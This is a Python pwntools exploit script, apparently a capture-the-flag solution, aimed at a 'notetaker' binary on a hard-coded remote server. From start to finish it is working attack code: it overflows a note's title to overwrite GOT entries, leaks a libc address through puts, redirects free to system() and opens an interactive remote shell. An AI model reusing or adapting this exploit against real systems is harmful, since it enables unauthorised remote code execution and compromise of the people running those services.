from pwn import *

elf = ELF('./notetaker')
libc = ELF('./libc.so.6')

def add(size1, title, size2, description):
	r.sendlineafter('>', '1')
	r.sendlineafter(':', str(size1))
	r.sendafter(':', title)
	r.sendlineafter(':', str(size2))
	r.sendafter(':', description)

def edit(idx, title, content):
	r.sendlineafter('>', '2')
	r.sendlineafter(':', str(idx))
	r.sendafter(':', title)
	if content != '':
		r.sendafter(':', content)

def free(idx):
	r.sendlineafter('>', '4')
	r.sendlineafter(':', str(idx))

def DEBUG():
	gdb.attach(r)


free_got = elf.symbols['got.free']
puts_got = elf.symbols['got.puts']
puts_plt = elf.symbols['plt.puts']
setvbuf_got = elf.symbols['got.setvbuf']

#r = process('./notetaker')
r = remote('35.226.111.216', 1111)

for i in range(13):
	print "i = ", i
	add(10, 't', 0x98, '/bin/sh;')

edit(1, 'a'*0x20+p64(free_got)[:3]+'a', p64(puts_plt)[:3]+'a')
edit(1, 'a'*0x20+p64(setvbuf_got)+'\x01a', '')
free(1)
libc_base = u64(r.recvuntil('\x7f')[-6:]+'\x00'*2) - libc.symbols['setvbuf']
print "libc_base @ ", hex(libc_base)
system = libc_base + libc.symbols['system']
print "system @ ", hex(system)

add(10, 't', 0x98, '/bin/sh;')
add(10, 't', 0x98, '/bin/sh;')
edit(1, 'a'*0x20+p64(free_got)[:3]+'a', p64(system)[:-1]+'a')
free(0)
#DEBUG()

r.interactive()